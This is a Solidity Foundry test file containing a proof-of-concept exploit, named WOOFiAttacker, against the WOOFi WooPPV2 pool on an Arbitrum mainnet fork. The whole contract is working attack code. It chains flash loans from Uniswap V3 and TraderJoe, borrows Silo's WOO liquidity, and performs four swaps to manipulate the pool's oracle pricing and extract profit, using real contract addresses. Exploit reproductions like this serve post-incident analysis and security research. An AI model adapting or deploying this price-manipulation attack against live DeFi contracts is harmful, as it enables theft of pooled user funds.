// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.20;

import {Test, console} from "lib/forge-std/src/Test.sol";

import {IERC20} from 'lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol';

import './interfaces/ITraderJoe.sol';
import './interfaces/ISilo.sol';
import './interfaces/IUniSwapV3Pool.sol';
import './interfaces/IWooPPV2.sol';
import './interfaces/IWETH.sol';



/// @title Flash contract implementation
/// @notice An example contract using the Uniswap V3 flash function
contract WOOFiAttacker is Test {
    address constant USDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant WOO = 0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b;
    ITraderJoe constant TRADERJOE = ITraderJoe(0xB87495219C432fc85161e4283DfF131692A528BD);
    ISilo constant SILO = ISilo(0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F);
    IWooPPV2 constant WOOPPV2 = IWooPPV2(0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062);
    IUniswapV3Pool constant POOL = IUniswapV3Pool(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    uint256 max = type(uint256).max;

    enum Action {
        NORMAL,
        REENTRANT
    }

    function setUp() public {
        vm.createSelectFork("arb", 187381784);
    }

    /// @param fee0 The fee from calling flash for token0
    /// @param fee1 The fee from calling flash for token1
    /// @param data The data needed in the callback passed as FlashCallbackData from `initFlash`
    /// @notice implements the callback called from flash
    /// @dev fails if the flash is not profitable, meaning the amountOut from the flash is less than the amount borrowed
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        // ILBFlashLoanCallback receiver, bytes32 amounts, bytes calldata data
        // flash loan WOO
        TRADERJOE.flashLoan(ILBFlashLoanCallback(address(this)), 0x000000000000000000000000000000000000000000023cb6623e110c5808cb69, new bytes(0));
        IERC20(USDC).transfer(msg.sender, 10580749131947 + fee1);
    }

    function uniSwapV3SwapCallback (uint256 amount0, uint256 amount1, bytes calldata data) external {
        IERC20(USDC).transfer(address(POOL), amount1);
    }

    function LBFlashLoanCallback(
        address sender,
        IERC20 tokenX,
        IERC20 tokenY,
        bytes32 amounts,
        bytes32 totalFees,
        bytes calldata data
    ) external returns (bytes32) {
        console.log("got here");
        // deposit USDC and borrow all the WOO liquidity (idk if Woo oracle  using Silo for pricing or whether this is just to get even bigger WOO balance)
        SILO.deposit(USDC, 7000000000000, true);
        uint256 amount = SILO.liquidity(WOO);
        SILO.borrow(WOO, amount);

        // 4 consecutive swaps (assume to mess with pricing updates):
        // Sets up the USDC to be expensive & WOO to be cheap
        // 1. USDC -> WETH to update the USDC oracle
        IERC20(USDC).transfer(address(WOOPPV2), 2000000000000);
        WOOPPV2.swap(USDC, WETH, 2000000000000, 0, address(this), address(this));
        // 2. USDC -> WOO 
        IERC20(USDC).transfer(address(WOOPPV2), 100000000000);
        WOOPPV2.swap(USDC, WOO, 100000000000, 0, address(this), address(this));
        // 3. WOO -> USDC
        IERC20(WOO).transfer(address(WOOPPV2), 7856868800000000000000000);
        WOOPPV2.swap(WOO, USDC, 7856868800000000000000000, 0, address(this), address(this));
        // 4. USDC -> WOO // reap the rewards
        IERC20(USDC).transfer(address(WOOPPV2), 926342);
        WOOPPV2.swap(USDC, WOO, 926342, 0, address(this), address(this));
        // repay WOO loan, receive USDC
        SILO.repay(WOO, max);
        SILO.withdraw(USDC, max, true);
        // NOTE: calculate this
        IERC20(WOO).transfer(msg.sender, uint256(amounts) + uint256(totalFees));
        // repay WOO flash loan & repay USDC flash loan automatically 
        bytes32 rData = keccak256("LBPair.onFlashLoan");
        return rData;
    }

    /// @notice Calls the pools flash function with data needed in `uniswapV3FlashCallback`
    function initFlash() public {
        // inital approvals required for the tokens 
        console.log("here2");
        IERC20(WOO).approve(address(WOOPPV2), max);
        IERC20(WOO).approve(address(SILO), max);
        IERC20(USDC).approve(address(SILO), max);
        IERC20(USDC).approve(address(WOOPPV2), max);
        // flash loan USDC
        POOL.flash(
            address(this),
            0,
            10580749131947,
            abi.encode(uint256(1))
        );
        // swap excess USDC for WETH
        POOL.swap(address(this), false, 141601385099, 5148059652436460709226212, new bytes(0));
        // send excess WOO to another address (which converts to ETH)
        uint256 excessETHBalance = IERC20(WETH).balanceOf(address(this));
        IWETH(WETH).withdraw(excessETHBalance);
        uint256 excessWOOBalance = IERC20(WOO).balanceOf(address(this));
        IERC20(WOO).transfer(address(this), excessWOOBalance);
    }

    function testPoc() public {
        // perform the attack!
        console.log("here");
        
        initFlash();
    }
    
}
